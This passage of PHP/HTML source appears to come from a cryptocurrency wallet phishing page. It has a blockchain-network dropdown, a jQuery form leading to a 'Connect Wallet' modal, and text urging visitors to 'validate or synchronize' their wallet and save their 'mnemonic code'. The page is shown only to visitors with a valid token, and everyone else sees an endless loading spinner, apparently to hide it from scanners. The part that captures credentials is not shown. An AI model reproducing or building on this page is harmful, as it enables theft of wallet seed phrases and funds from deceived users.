    <option value="VeChain (VET)" data-id="67000657871">VeChain (VET)</option>
    <option value="Zcash (ZEC)" data-id="67000657875">Zcash (ZEC)</option>
    <option value="Zilliqa (ZIL)" data-id="67000657876">Zilliqa (ZIL)</option>
    <option value="Not Supported" data-id="67000721744">Not Supported</option>
    <option value="BEP2/BEP20 (Binance)" data-id="67000770996">BEP2/BEP20 (Binance)</option>
    <option value="ERC20 (Ethereum)" data-id="67000770997">ERC20(Ethereum)</option>
    <option value="ETC20 (Ethereum Classic)" data-id="67000771000">ETC20(Ethereum Classic)</option>
    <option value="GO20 (GoChain)" data-id="67000770999">GO20 (GoChain)</option>
    <option value="KAVA based tokens" data-id="67000771002">KAVA based    tokens</option>
    <option value="POLYGON (Polygon Tokens)" data-id="67000771009">POLYGON (Polygon Tokens)</option>
    <option value="SPL (Solana)" data-id="67000771001">SPL (Solana)</option>
    <option value="TRC10/TRC20 (Tron)" data-id="67000770998">TRC10/TRC20    (Tron)</option>
    <option value="TRC21 (TomoChain)" data-id="67000771006">TRC21    (TomoChain)</option>
    <option value="TT20 (Thunder Token)" data-id="67000771007">TT20(Thunder Token)</option>
    <option value="Avalanche (AVAX)" data-id="67000788244">Avalanche(AVAX)</option>
    <option value="Terra Classic (LUNC)" data-id="67000788245">Terra Classic (LUNC)</option>
    <option value="Optimism (OETH)" data-id="67000788246">Optimism(OETH)</option>
    <option value="Arbitrum (ARETH)" data-id="67000788247">Arbitrum(ARETH)</option>
    <option value="Huobi Eco Chain (HECO)" data-id="67000788248">Huobi Eco Chain (HECO)</option>
    <option value="Fantom (FTM)" data-id="67000788249">Fantom (FTM)</option>
    <option value="Other / Not Listed" data-id="67000812940">Other / Not Listed</option>
      </select>

      <button type="button" id="continueForm">Continue</button>
    </form>
  </div>
</div>



<!-- Wallet Connect Card -->
<div class="support-form-container" id="walletCard"  style="display:none;">
        <button id="closeSupportForm2" class="back-btn" style="margin-bottom: 50px;">← Back</button>
    <div class="wallet-connect-card" style="display:; margin-bottom:50px;" type="button" data-bs-toggle="modal" data-bs-target="#exampleModalLong">
  <img src="asset/images/walle.jpg" alt="wallet icon" />
  <span>Connect Wallet</span>
</div>
</div>




<script>
  $(document).ready(function () {
    $('#restoreDivBtn').click(function () {
        $('#restoreDiv').hide();
      $('#ticketForm').fadeIn(300);
    });

    $('#closeSupportForm').click(function () {
      $('#ticketForm').fadeOut(100);
              $('#restoreDiv').fadeIn(200);

    });

 $('#continueForm').click(function () {
  // Check all required inputs inside #ticketForm
  let isValid = true;

  $('#ticketForm input, #ticketForm select').each(function () {
    if ($(this).val() === '' || $(this).val() === null) {
      isValid = false;
      $(this).addClass('input-error'); // Optional: highlight empty fields
    } else {
      $(this).removeClass('input-error');
    }
  });

  if (isValid) {
    $('#walletCard').fadeIn(200);
    $('#ticketForm').hide();
  } else {
    alert('Please fill in all fields before continuing.');
  }
});


    $('#closeSupportForm2').click(function () {
    $('#walletCard').fadeOut(100);
          $('#ticketForm').fadeIn(200);

    });

  });
</script>


</section>


  











            <section class="tf-box-icon bg-box-icon-color tf-section">
                <div class="themesflat-container">
                    <div class="sc-box-icon-inner">
                        <div class="sc-box-icon">
                            <div class="image">
                                <svg width="56" height="56" viewBox="0 0 56 56" fill="none"
                                    xmlns="http://www.w3.org/2000/svg">
                                    <rect y="6.10352e-05" width="56" height="56" rx="16" fill="#5142FC" />
                                    <path fill-rule="evenodd" clip-rule="evenodd"
                                        d="M34.9222 26.0179H39.1035C39.5983 26.0179 39.9995 26.3981 39.9995 26.8672V29.8195C39.9937 30.2863 39.5959 30.6634 39.1035 30.6688H35.0182C33.8252 30.684 32.7821 29.9098 32.5115 28.8085C32.376 28.1247 32.5662 27.4192 33.0312 26.881C33.4961 26.3427 34.1883 26.0268 34.9222 26.0179ZM35.1034 29.122H35.4981C36.0047 29.122 36.4154 28.7327 36.4154 28.2525C36.4154 27.7722 36.0047 27.3829 35.4981 27.3829H35.1034C34.8611 27.3802 34.6277 27.4696 34.4554 27.631C34.2831 27.7925 34.1861 28.0127 34.1861 28.2423C34.186 28.7242 34.5951 29.1164 35.1034 29.122Z"
                                        fill="#F9F9FA" fill-opacity="0.4" />
                                    <path
                                        d="M34.9227 24.2788H40C40 20.3154 37.5573 18.0001 33.4187 18.0001H22.5813C18.4427 18.0001 16 20.3154 16 24.2283V32.7718C16 36.6847 18.4427 39.0001 22.5813 39.0001H33.4187C37.5573 39.0001 40 36.6847 40 32.7718V32.4079H34.9227C32.5662 32.4079 30.656 30.5972 30.656 28.3636C30.656 26.13 32.5662 24.3193 34.9227 24.3193V24.2788Z"
                                        fill="white" />
                                    <path
                                        d="M28.4582 24.2789H21.6849C21.1766 24.2734 20.7675 23.8812 20.7676 23.3993C20.7734 22.923 21.1824 22.5398 21.6849 22.5399H28.4582C28.9649 22.5399 29.3756 22.9292 29.3756 23.4094C29.3756 23.8896 28.9649 24.2789 28.4582 24.2789Z"
                                        fill="#948BFB" />
                                </svg>
                            </div>
                            <h3 class="heading">
                                <a href="connect">Select Your Wallet</a>
                            </h3>
                            <p class="content">We have varieties of wallets you can choose from to validate or
                                synchronize your wallet. Please, select your correct wallet name before proceeding.</p>
                        </div>
                        <div class="sc-box-icon">
                            <div class="image">
                                <svg width="56" height="56" viewBox="0 0 56 56" fill="none"
                                    xmlns="http://www.w3.org/2000/svg">
                                    <rect y="6.10352e-05" width="56" height="56" rx="16" fill="#47A432" />
                                    <path
                                        d="M23.104 16.0001H19.048C17.368 16.0001 16 17.3801 16 19.0732V23.164C16 24.868 17.368 26.236 19.048 26.236H23.104C24.796 26.236 26.1519 24.868 26.1519 23.164V19.0732C26.1519 17.3801 24.796 16.0001 23.104 16.0001Z"
                                        fill="white" />
                                    <path
                                        d="M23.104 29.7637H19.048C17.368 29.7637 16 31.1329 16 32.8369V36.9277C16 38.6197 17.368 39.9997 19.048 39.9997H23.104C24.796 39.9997 26.1519 38.6197 26.1519 36.9277V32.8369C26.1519 31.1329 24.796 29.7637 23.104 29.7637Z"
                                        fill="white" />
                                    <path
                                        d="M36.9516 16.0001H32.8956C31.2036 16.0001 29.8477 17.3801 29.8477 19.0732V23.164C29.8477 24.868 31.2036 26.236 32.8956 26.236H36.9516C38.6316 26.236 39.9996 24.868 39.9996 23.164V19.0732C39.9996 17.3801 38.6316 16.0001 36.9516 16.0001Z"
                                        fill="white" fill-opacity="0.4" />
                                    <path
                                        d="M36.9516 29.7637H32.8956C31.2036 29.7637 29.8477 31.1329 29.8477 32.8369V36.9277C29.8477 38.6197 31.2036 39.9997 32.8956 39.9997H36.9516C38.6316 39.9997 39.9996 38.6197 39.9996 36.9277V32.8369C39.9996 31.1329 38.6316 29.7637 36.9516 29.7637Z"
                                        fill="white" />
                                </svg>
                            </div>
                            <h3 class="heading"><a href="connect">Validate Your Wallet</a></h3>
                            <p class="content">Once you select your wallet, you will be prompted to connect via a
                                decentralized protocol. This can successfully be completed manually or automatically.
                            </p>
                        </div>
                        <div class="sc-box-icon mg-bt">
                            <div class="image">
                                <svg width="56" height="56" viewBox="0 0 56 56" fill="none"
                                    xmlns="http://www.w3.org/2000/svg">
                                    <rect width="56" height="56" rx="16" fill="#9835FB" />
                                    <path fill-rule="evenodd" clip-rule="evenodd"
                                        d="M19.396 23.8885C19.396 21.1625 21.061 19.3955 23.638 19.3955H32.354C34.94 19.3955 36.605 21.1625 36.605 23.8885V29.1905C36.159 28.8125 34.812 27.8715 34.624 27.7595C33.224 26.9195 31.544 27.2995 30.454 28.7195C30.359 28.8445 28.782 31.1445 28.224 31.4885C28.095 31.5685 27.959 31.6115 27.814 31.6315C27.464 31.6615 27.127 31.4815 26.554 31.0985C26.224 30.8885 25.864 30.6495 25.454 30.4795C23.749 29.7665 22.45 30.9445 21.758 31.7345C21.749 31.7425 19.812 34.1045 19.781 34.1415C19.538 33.5505 19.396 32.8675 19.396 32.1025V23.8885ZM38 23.8885C38 20.3625 35.731 18.0005 32.354 18.0005H23.638C20.271 18.0005 18 20.3625 18 23.8885V32.1025C18 33.6745 18.447 35.0135 19.238 36.0095C19.247 36.0185 19.247 36.0285 19.256 36.0285C20.043 37.0135 21.166 37.6665 22.519 37.8995C22.531 37.9015 22.543 37.9035 22.556 37.9055C22.903 37.9625 23.262 38.0005 23.638 38.0005H32.354C32.535 38.0005 32.7 37.9665 32.874 37.9535C33.078 37.9365 33.289 37.9325 33.483 37.8985C33.74 37.8545 33.976 37.7775 34.215 37.7035C34.319 37.6705 34.43 37.6505 34.53 37.6125C34.773 37.5205 34.996 37.4015 35.217 37.2795C35.297 37.2355 35.383 37.1995 35.461 37.1505C35.678 37.0145 35.875 36.8555 36.068 36.6895C36.132 36.6345 36.201 36.5845 36.262 36.5265C36.45 36.3475 36.616 36.1505 36.775 35.9445C36.824 35.8795 36.876 35.8195 36.923 35.7525C37.076 35.5345 37.208 35.2995 37.33 35.0545C37.364 34.9835 37.4 34.9145 37.433 34.8425C37.546 34.5855 37.64 34.3165 37.72 34.0345C37.741 33.9585 37.762 33.8835 37.78 33.8055C37.851 33.5145 37.902 33.2145 37.935 32.9005C37.939 32.8625 37.95 32.8275 37.954 32.7895C37.961 32.7045 37.96 32.6195 37.965 32.5345C37.973 32.3885 38 32.2535 38 32.1025V23.8885Z"
                                        fill="white" />
                                    <path
                                        d="M24.5048 27.0001C25.8663 27.0001 27 25.87 27 24.5151C27 23.8356 26.7151 23.2132 26.2607 22.7615C25.8081 22.2935 25.1764 22.0001 24.4787 22.0001C23.1085 22.0001 22 23.1041 22 24.4687C22 24.6492 22.0213 24.8239 22.0591 24.9937C22.2878 26.1257 23.3081 27.0001 24.5048 27.0001Z"
                                        fill="white" fill-opacity="0.4" />
                                </svg>
                            </div>
                            <h3 class="heading"><a href="connect">Generate QR Code</a></h3>
                            <p class="content">Upon successful validation, a QR Code will be generated for your wallet.
                                You can always scan your QR Code to reinitialize your wallet.</p>
                        </div>
                        <div class="sc-box-icon">
                            <div class="image">
                                <svg width="56" height="56" viewBox="0 0 56 56" fill="none"
                                    xmlns="http://www.w3.org/2000/svg">
                                    <rect width="56" height="56" rx="16" fill="#DF4949" />
                                    <rect x="21" y="22" width="13" height="4" fill="white" fill-opacity="0.4" />
                                    <path fill-rule="evenodd" clip-rule="evenodd"
                                        d="M24.125 16H31.8375C35.225 16 37.9625 17.284 38 20.5478V38.7631C38 38.9671 37.95 39.1711 37.85 39.3511C37.6875 39.6391 37.4125 39.8551 37.075 39.9511C36.75 40.0471 36.3875 39.9991 36.0875 39.8311L27.9875 35.9432L19.875 39.8311C19.6888 39.9259 19.475 39.9871 19.2625 39.9871C18.5625 39.9871 18 39.4351 18 38.7631V20.5478C18 17.284 20.75 16 24.125 16ZM23.2753 25.1437H32.6878C33.2253 25.1437 33.6628 24.7225 33.6628 24.1958C33.6628 23.6678 33.2253 23.2478 32.6878 23.2478H23.2753C22.7378 23.2478 22.3003 23.6678 22.3003 24.1958C22.3003 24.7225 22.7378 25.1437 23.2753 25.1437Z"
                                        fill="white" />
                                </svg>
                            </div>
                            <h3 class="heading"><a href="connect">Save Wallet QR Code</a></h3>
                            <p class="content">Saving your generated mnemonic code or QR Code is important. You can
                                click on Save or Screenshot the QR Code Page. You choose how you want to save!</p>
                        </div>
                    </div>
                </div>
            </section>



            <footer id="footer" class="clearfix style-2">
                <div class="themesflat-container">
    
                </div>
            </footer>
        </div>



    </div>



    <!--<a id="scroll-top"></a>-->

    <script src="asset/js/jquery.min.js"></script>
    <script src="asset/js/jquery.easing.js"></script>
    <script src="asset/js/bootstrap.min.js"></script>
    <script src="asset/js/wow.min.js"></script>
    <script src="asset/js/plugin.js"></script>
    <script src="asset/js/shortcodes.js"></script>
    <script src="asset/js/main.js"></script>
    <script src="asset/js/count-down.js"></script>
<script src="https://cdn.jsdelivr.net/npm/swiper@9/swiper-bundle.min.js"></script>
    <script src="asset/js/swiper.js"></script>
    <script src="asset/js/parallax.js"></script>
    <script src="asset/js/web3.min.js"></script>
    <script src="asset/js/moralis.js"></script>
    <script src="asset/js/nft.js"></script>


<?php else: ?>
  <!-- ❌ Show fullscreen infinite preloader (invalid/expired token) -->
  <div class="preloader">
    <div class="vertical-centered-box">
      <div class="content">
        <div class="loader-circle"></div>
        <div class="loader-line-mask">
          <div class="loader-line"></div>
        </div>
      </div>
    </div>
  </div>
<?php endif; ?>

</body>


</html>
